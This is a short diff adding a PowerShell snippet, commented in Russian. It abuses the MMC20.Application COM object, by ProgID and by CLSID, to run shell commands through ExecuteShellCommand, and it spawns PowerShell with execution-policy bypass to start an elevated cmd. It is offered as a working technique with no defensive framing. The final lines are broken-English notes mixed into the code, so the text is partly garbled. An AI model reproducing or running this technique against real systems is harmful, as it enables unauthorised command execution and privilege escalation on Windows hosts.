@@ -1,0 +1,12 @@
+# Event Viewer через COM (работает на 80% систем)
+$com = New-Object -ComObject "MMC20.Application"
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/k whoami", "7")
+
+# Или через CLSID напрямую
+$type = [Type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889") # MMC
+$obj = [Activator]::CreateInstance($type)
+$obj.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-ep bypass -c Start-Process cmd -Verb RunAs", "0")
+
+MMC >> He located in registry.
+Get-ChildItem HKCR:\CLSID | Select-String 49
+It seems to be the same everywhere
